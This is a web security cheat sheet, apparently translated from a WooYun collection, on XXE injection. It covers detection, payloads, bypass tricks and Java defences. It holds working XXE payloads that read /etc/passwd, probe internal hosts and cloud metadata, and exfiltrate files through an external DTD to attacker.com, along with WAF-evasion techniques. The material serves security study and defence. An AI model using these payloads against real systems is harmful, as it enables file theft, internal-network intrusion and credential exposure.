# Web Security - XXE(XML External entity injection)

> Source: WooYun Vulnerability database | Dismantled From web-injection.md

## Four、XXE (XMLExternal Entity Injection)

### 4.1 Nature of vulnerabilities

```
XMLInput. -> Parser enabledDTD/External entities -> Entity references are resolved and executed -> File reading/SSRF/RCE
```

**Core formula**:XXE = XMLParser allows external entity references + User-controllableXMLInput.

### 4.2 Detection method

**High-risk entry point identification**

| Entry type | Detection Features | Typical scenarios |
|----------|----------|----------|
| APIInterface | Content-TypeContaining`text/xml`Or`application/xml` | RESTful API、SOAP WebService |
| File upload | SVGImages、DOCX/XLSX/PPTX(EssenceZIPContainingXML) | Avatar upload、Document import |
| Data parsing | XMLConfiguration import、RSS/AtomSubscription | Backend management、Aggregation function |
| Protocol interaction | SAMLAuthentication、WebDAV、XMPP | SSOLogin、File management |

**Quick Detection Process**

```
1. IdentificationXMLHandling interface → ModifyContent-TypeForapplication/xmlTesting
2. Send basicDTDDeclaration → Observe if parsing(Error reporting differences)
3. Attempt external entity reference → fileProtocol reading of known files
4. When there is no echo → OOBTakeaway(DNS/HTTPCall back)
```

### 4.3 ClassicPayload

#### File reading (with echo)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

#### SSRFInternal network detection

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal:8080/">]>
<foo>&xxe;</foo>

<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>
```

#### Blind injection - OOBTakeout data

```xml
<!-- ExternalDTD (attackerServer hostingevil.dtd) -->
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>

<!-- evil.dtdContent: -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?d=%file;'>">
%eval;
%exfil;
```

#### Error feedback

```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % error "<!ENTITY &#x25; e SYSTEM 'file:///nonexistent/%file;'>">
  %error;
  %e;
]>
```

### 4.4 Bypassing techniques

| Bypass Method | Method | Applicable scenarios |
|----------|------|----------|
| Encoding bypass | UTF-16BE/LE、UTF-7CodeXML | WAFBased onASCIIPattern matching |
| Parameter entity nesting | `%entity;`Alternative`&entity;` | Filter common entities`&` |
| XInclude | `<xi:include href="file:///etc/passwd"/>` | UncontrollableDOCTYPEDeclaration |
| SVGEmbed | SVGFile embeddingXXEEntity | Only allow image uploads |
| DOCX/XLSXEmbed | ModifyOfficeWithin the document`[Content_Types].xml` | Document upload function |
| CDATApackages. | UseCDATASegment Bypass Special Character Restrictions | Read containingXMLFiles with special characters |

### 4.5 Defensive measures

```java
// Java: DisableDTDAnd external entities.
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

- DisableDTDProcessing and external entity resolution (preferred)
- UseJSONAlternativeXMLPerform data exchange
- Input whitelist verification、UpgradeXMLParsing library
- WAFRule interception`<!DOCTYPE`/`<!ENTITY`/`SYSTEM`Keyword

---

